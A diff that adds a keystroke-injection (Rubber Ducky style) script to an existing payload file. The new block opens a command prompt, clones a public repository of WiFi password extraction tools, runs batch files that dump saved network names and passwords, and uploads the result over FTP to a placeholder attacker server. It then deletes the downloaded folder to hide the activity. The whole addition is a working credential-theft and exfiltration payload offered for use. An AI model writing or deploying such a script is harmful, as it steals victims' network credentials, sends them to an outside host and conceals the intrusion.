@@ -62,3 +62,60 @@ STRING Y
 ENTER
 DELAY 500
 ALT F4
+
+REM WiFi Password Collection!
+REM Open CMD
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 500
+STRING cd Documents
+ENTER
+DELAY 500
+REM Download the yoinking tools
+STRING git clone https://github.com/Keiranos/WiFi-Password-Extract
+ENTER
+DELAY 2000
+STRING cd WiFi-Password-Extract
+ENTER
+DELAY 200
+STRING SSIDYoink.bat
+ENTER
+DELAY 1000
+STRING "Pass collection.bat"
+ENTER
+DELAY 1000
+
+REM Start FTP upload of data
+STRING ftp
+ENTER
+DELAY 200
+STRING o
+ENTER
+STRING [FTP Address] 21
+ENTER
+DELAY 200
+STRING [Username]
+ENTER
+DELAY 200
+STRING [Password]
+ENTER
+DELAY 1000
+STRING put A.txt
+ENTER
+DELAY 1000
+STRING quit
+ENTER
+REM Quit and delete files&folders
+DELAY 500
+STRING cd ..
+ENTER
+DELAY 500
+STRING rmdir /s .\WiFi-Password-Extract
+ENTER
+DELAY 500
+STRING Y
+ENTER
+DELAY 500
+ALT F4
